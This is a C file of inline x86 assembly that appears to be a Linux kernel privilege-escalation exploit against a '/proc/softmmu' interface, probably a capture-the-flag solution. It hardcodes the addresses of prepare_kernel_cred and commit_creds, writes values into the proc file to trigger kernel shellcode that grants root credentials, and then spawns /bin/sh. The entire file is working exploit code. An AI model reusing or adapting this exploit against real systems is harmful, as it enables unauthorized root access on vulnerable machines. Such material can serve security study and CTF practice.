#include <stdint.h>

// prepare_kernel_cred  c10720e0
// commit_creds         c1071d20

int32_t _start(){
    asm(".intel_syntax noprefix");
    asm("call main");
    asm(".ascii \"/proc/softmmu\\0\"");
    
    asm("shellcode:");
    asm("xor edx, edx");
    asm("xor ecx, ecx");
    asm("xor ebx, ebx");
    asm("xor eax, eax");
    asm("call 0xc10720e0");
    asm("call 0xc1071d20");
    asm("push 0x41414141");
    asm("ret");

    asm("atoi:");
    asm("mov edx, 0x1000");
    asm("mov ecx, esp");
    asm("sub ecx, 0x1000");
    asm("mov ebx, 0");
    asm("mov eax ,3");
    asm("int 0x80");
    asm("mov esi, ecx");
    asm("mov ecx, eax");
    asm("xor eax, eax");
    asm("loop:");
    asm("cmp ecx, 0");
    asm("jle out");
    asm("xor ebx, ebx");
    asm("mov bl, [esi]");
    asm("cmp bl, 0x40");
    asm("jae out");
    asm("cmp bl, 0x2f");
    asm("jbe out");
    asm("sub bl, 0x30");
    asm("mov edx, 10");
    asm("mul edx");
    asm("add eax, ebx");
    asm("inc esi");
    asm("dec ecx");
    asm("jmp loop");
    asm("out:");
    asm("ret");
    
    asm("open:");
    asm("mov ecx, 2");
    asm("mov ebx, esi");
    asm("mov eax, 5");
    asm("int 0x80");
    asm("ret");

    asm("write:");
    asm("push edi");
    asm("mov edx, 4");
    asm("mov ecx, esp");
    asm("mov ebx, 3");
    asm("mov eax, 4");
    asm("int 0x80");
    asm("add esp, 4");
    asm("ret");

    asm("read:");
    asm("mov edx, 4");
    asm("mov ecx, edi");
    asm("mov ebx, 3");
    asm("mov eax, 3");
    asm("int 0x80");
    asm("ret");

    asm("close:");
    asm("mov ebx, 3");
    asm("mov eax, 6");
    asm("int 0x80");
    asm("ret");

    asm("exit:");
    asm("mov eax, 1");
    asm("int 0x80");

    asm("main:");
    asm("pop esi");
    asm("call open");
    asm("mov edi, 0x80481fd");
    asm("call write");
    asm("call read");

    asm("mov edx, 0x1000");
    asm("mov ecx, esp");
    asm("sub ecx, 0x1000");
    asm("mov ebx, 0");
    asm("mov eax, 3");
    asm("int 0x80");
    asm("mov edi, ecx");
    asm("call write");
    asm("call read");
    
    asm("mov edx, 0x1000");
    asm("mov ecx, esp");
    asm("sub ecx, 0x1000");
    asm("mov ebx, 0");
    asm("mov eax, 3");
    asm("int 0x80");
    asm("mov edi, ecx");
    asm("call write");
    asm("call read");

    asm("call shell");
    asm(".ascii \"/bin/sh\\0\"");
    asm("shell:");
    asm("pop ebx");
    asm("push 0");
    asm("mov edx, esp");
    asm("push ebx");
    asm("mov ecx, esp");
    asm("mov eax, 0xb");
    asm("int 0x80");

    asm("call close");
    asm("call exit");

    asm(".ascii \"%08x %08x %08x %08x %08x\n\"");
    asm(".ascii \"%08x %08x %08x %08x %08x\n\"");
    asm(".ascii \"%08x %08x %08x %08x %08x\n\"");
    asm(".ascii \"%08x %08x %08x %08x %08x\n\"");
    asm(".ascii \"%08x %08x %08x %08x %08x\\0\"");
    asm(".ascii \"\"");
    asm(".att_syntax prefix");
}
